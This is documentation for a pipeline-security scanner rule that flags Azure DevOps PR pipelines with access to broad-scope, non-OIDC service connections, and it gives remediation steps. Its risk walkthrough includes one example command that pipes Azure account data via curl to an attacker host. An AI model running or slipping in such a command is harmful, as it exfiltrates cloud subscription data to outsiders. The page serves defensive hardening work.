# Service Connection Scope Mismatch

**Rule ID:** `service_connection_scope_mismatch`
**Severity:** High
**Category:** Privilege
**Tags:** security, privilege-escalation
**Platform:** Azure DevOps only

## Detection

taudit fires when: the pipeline has a `pr:` trigger, and a Step has `HasAccessTo` an Identity node that is simultaneously: marked as a service connection (`META_SERVICE_CONNECTION = "true"`), not OIDC-federated (`META_OIDC` is absent or not `"true"`), and has broad or unknown scope (`META_IDENTITY_SCOPE` is `"broad"`, `"Broad"`, or absent).

Service connections with broad scope and no OIDC federation are static credentials — a client secret, certificate, or managed identity credential that lives in ADO and can be used indefinitely until rotated.

## Risk

ADO service connections are the mechanism by which pipelines authenticate to Azure (and other external services). When a service connection has subscription-level Azure RBAC permissions, it can read, modify, or delete any resource in that Azure subscription.

When such a connection is accessible from a PR-triggered pipeline:

1. An external contributor opens a PR.
2. The PR pipeline runs and a step uses the broad-scope service connection to run an Azure CLI command (e.g., `az deployment group create`).
3. The attacker's PR modifies the step's script or a referenced configuration file to instead run: `az account list --output json | curl -X POST https://attacker.com/collect -d @-`
4. The attacker now has the subscription's resource inventory and has demonstrated they can call any Azure API with subscription-scope permissions from the PR pipeline.

The "no OIDC" condition matters because OIDC-federated service connections use short-lived tokens — even if exfiltrated, they expire quickly (typically within minutes). A static client secret or certificate does not expire automatically and has a much larger exposure window.

Subscription-wide RBAC is not hypothetical. Many organisations create service connections at the subscription level for convenience during development. Those connections carry the ability to access every storage account, key vault, database, and compute resource in the subscription.

## Remediation

1. **Immediate — scope the service connection to a resource group, not a subscription:**

   In the Azure portal:
   - Go to the Azure portal → Subscriptions → [your subscription] → Access control (IAM)
   - Remove the service principal's subscription-level role assignment
   - Go to the specific resource group → Access control (IAM)
   - Add the service principal with the minimum required role (e.g., Contributor on just the deployment resource group)

   In ADO (Project Settings → Service connections → [connection] → Edit):
   - Change "Scope level" from "Subscription" to "Resource Group"
   - Select the specific resource group

2. **Better — migrate to OIDC-federated service connections:**

   ADO now supports workload identity federation for service connections. This eliminates the stored credential entirely:
   - Project Settings → Service connections → New service connection → Azure Resource Manager
   - Select "Workload identity federation (automatic)" or "Workload identity federation (manual)"
   - The connection uses short-lived OIDC tokens — no client secret to rotate or exfiltrate

3. **Remove the service connection from PR-triggered jobs:** PR validation usually does not need production Azure access. Move deployment steps to a separate CD pipeline triggered by merge to main, gated with environment approvals:
   ```yaml
   # pr-ci.yml — no service connection
   pr:
     branches: [main]
   steps:
     - script: ./build.sh
     - script: ./test.sh
   
   # cd.yml — service connection only here, gated
   trigger:
     branches: [main]
   pr: none
   stages:
     - stage: Deploy
       jobs:
         - deployment: DeployProd
           environment: Production  # approval required
           steps:
             - task: AzureCLI@2
               inputs:
                 azureSubscription: MyServiceConnection
   ```

4. **Verify:** Re-run `taudit scan`. The finding resolves when the service connection is either removed from the PR pipeline, scoped to a resource group instead of a subscription, or migrated to OIDC federation. If it persists, check whether `META_IDENTITY_SCOPE` is being set correctly — the scope is inferred from the connection's Azure RBAC role, which taudit reads from the parsed YAML metadata.

## See also

- [variable_group_in_pr_job](variable_group_in_pr_job.md) — ADO variable group secrets in PR context
- [trigger_context_mismatch](trigger_context_mismatch.md) — broader trigger authority pattern
- [over_privileged_identity](over_privileged_identity.md) — over-scoped identity (not PR-specific)
- [ADO workload identity federation](https://learn.microsoft.com/en-us/azure/devops/pipelines/library/connect-to-azure#create-an-azure-resource-manager-service-connection-using-workload-identity-federation)
- [ADO — service connection security](https://learn.microsoft.com/en-us/azure/devops/pipelines/library/service-endpoints#secure-a-service-connection)
